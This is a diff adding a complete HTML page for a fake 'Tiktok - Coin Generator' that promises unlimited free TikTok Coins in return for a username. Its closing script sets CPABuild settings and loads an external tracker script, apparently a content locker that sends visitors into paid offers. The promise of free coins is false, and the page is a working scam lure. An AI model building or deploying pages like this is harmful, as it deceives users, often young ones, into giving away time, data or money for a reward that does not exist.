@@ -1,0 +1,98 @@
+
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
+	<head>
+		<title>Tiktok - Coin Generator</title>
+		<meta name="viewport" content="height=device-height, width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, target-densitydpi=device-dpi">
+		<meta name="description" content="Get as many Tiktok Coins as you like!" />    
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+		<link rel="icon" type="image/ico" href="assets/img/favicon.ico" />
+		<!-- Open Graph Meta Tags-->
+		<meta property="og:title" content="Tiktok - Coin Generator" /> <!-- Title which is displayed when your site is shared on social networks -->
+		<meta property="og:description" content="Get as many Tiktok Coins as you like!" /> <!-- Website description which is displayed when your site is shared on social networks -->
+		<meta property="og:type" content="website" />
+		<meta property="og:url" content="http://giftcentral.io/tiktok/" /> <!-- Your Website URL -->
+		<!-- Twitter Meta -->
+		<meta name="twitter:card" content="summary" />
+		<meta name="twitter:title" content="Tiktok - Coin Generator" />
+		<meta name="twitter:description" content="Get as many Tiktok Coins as you like!" />
+		<!-- Icons -->
+		<link rel="stylesheet" href="https://cdn.linearicons.com/free/1.0.0/icon-font.min.css">
+		<link href="https://fonts.googleapis.com/icon?family=Material+Icons|Material+Icons+Two+Tone|" rel="stylesheet">
+		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.8.0/css/all.min.css" integrity="sha512-3PN6gfRNZEX4YFyz+sIyTF6pGlQiryJu9NlGhu9LrLMQ7eDjNgudQoFDK3WSNAayeIKc6B8WXXpo4a7HqxjKwg==" crossorigin="anonymous" />
+		<!-- Fonts -->
+		<link rel="preconnect" href="https://fonts.googleapis.com">
+		<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+		<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;700;800&display=swap" rel="stylesheet">
+		<!-- CSS -->
+		<link href="assets/css/bootstrap.min.css" rel="stylesheet" />  
+		<link href="assets/css/animate.min.css" rel="stylesheet" />
+		<link href="assets/css/venobox.min.css" rel="stylesheet" />
+		<link href="assets/css/style.css" rel="stylesheet" />	
+		<link href="assets/css/a-c-c3.css" rel="stylesheet" />	</head>
+	<body>
+	<div class="imjaprl">
+		<div class="imjaprlc">
+			<div class="imjaprlc-i">
+				<div class="imjaprlc-l animate__animated animate__bounceIn animation-delay-300"><span class="material-icons-two-tone fa-spin">settings</span></div>
+				<div class="imjaprlc-lb animate__animated animate__bounceIn animation-delay-400"><div></div></div>
+			</div>
+		</div>
+	</div>
+	<section class="srl-mw">
+		<header>
+						<div class="container">
+				<div class="h-c">
+					<img src="assets/img/new logo.png" class="img-fluid l-i" />					<h1>Tiktok - Coin Generator</h1>					<p>This is the ONLY way to get Coins instantly.</p>				</div>	
+			</div>
+		</header>
+				<div class="container container-sh">			
+			<div class="isr-p-w isr-p-w-u aoi aoinv">
+				<div class="isr-cs-w">
+					<div class="isr-cs aoi aoinv animation-delay-100">
+						<span>1</span>
+					</div>
+				</div>
+				<div class="b-s-c-w">
+					<div class="c-i-t aoi aoinv animation-delay-200">
+						<span class="c-i-t-v">What's your Tiktok username?</span>
+					</div>
+					<div class="c-i-d aoi aoinv animation-delay-300">
+						<span class="c-i-d-v">Enter your Tiktok username to which you want to send the Coins too.</span>
+					</div>
+					<div class="viu-f-w">
+						<div id="u-f" class="aoi aoinv animation-delay-400">
+							<div class="viu-u-i-w">
+								<span class="material-icons-two-tone">face</span>
+								<input id="viu-u-i" class="viu-u-i" placeholder="Tiktok Username..." />
+							</div>
+						</div>
+						<div class="iew-e iew-e-u">
+							<div class="iew-e-i">
+								<span>Please enter your username.</span>
+							</div>
+						</div>
+					</div>
+					<div class="m-ft-b-w aoi aoinv animation-delay-600">
+						<div id="stb-ee-f" class="m-b-ig-d"><span>Proceed</span></div>
+					</div>
+				</div>
+				<div class="i-w-b-r-t-y"></div>
+			</div>				
+		</div>
+	</section>
+</body>	<!-- JS -->	
+	<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
+	<script type="text/javascript" src="assets/js/jquery.countTo.js"></script>
+	<script type="text/javascript" src="assets/js/venobox.min.js"></script>
+	<script type="text/javascript">var s_s;</script>
+		
+	<script type="text/javascript" src="assets/js/ion.sound.min.js"></script>
+	<script type="text/javascript">s_s = '1';</script>
+		
+			<script type="text/javascript" src="assets/js/drc.js"></script>
+		<script type="text/javascript" src="assets/js/main.js"></script>
+	<script type="text/javascript">
+    var CPABUILDSETTINGS={"it":2313260,"key":"34455"};
+</script>
+<script src="https://d12u7tum9sda5e.cloudfront.net/8906121.js"></script></html>
